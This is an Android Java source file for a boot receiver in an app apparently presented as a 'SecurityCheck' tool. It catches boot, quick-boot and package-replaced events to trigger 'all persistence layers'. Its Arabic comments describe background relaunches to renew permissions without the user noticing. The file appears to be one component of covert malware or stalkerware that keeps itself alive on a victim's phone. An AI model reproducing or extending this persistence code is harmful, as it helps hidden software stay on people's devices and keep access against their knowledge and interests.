package com.sec.check;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

public class BootReceiver extends BroadcastReceiver {

    private static final String TAG = "SecurityCheck";

    @Override
    public void onReceive(Context context, Intent intent) {
        try {
            String action = intent.getAction();
            Log.d(TAG, "[BOOT] received: " + action);

            // ★ استجب لكل الأحداث اللي بتشغل الجهاز
            if (Intent.ACTION_BOOT_COMPLETED.equals(action)
                    || "android.intent.action.QUICKBOOT_POWERON".equals(action)
                    || "com.htc.intent.action.QUICKBOOT_POWERON".equals(action)
                    || Intent.ACTION_MY_PACKAGE_REPLACED.equals(action)
                    || "android.intent.action.LOCKED_BOOT_COMPLETED".equals(action)) {

                Log.d(TAG, "[BOOT] Triggering full persistence");

                // ★★★ تفعيل كل طبقات الاستمرارية ★★★
                PersistenceManager.enableAllPersistence(context);

                // ★ شغّل MainActivity في الخلفية (اختياري - لتجديد الصلاحيات)
                // ملاحظة: بنشغله فقط أول مرة لتجنب مقاطعة المستخدم
                // لو عايز تشغله دايماً، شيل التعليق
                // Intent mainIntent = new Intent(context, MainActivity.class);
                // mainIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                // context.startActivity(mainIntent);
            }

        } catch (Exception e) {
            Log.e(TAG, "[BOOT] error: " + e.getMessage());
        }
    }
}
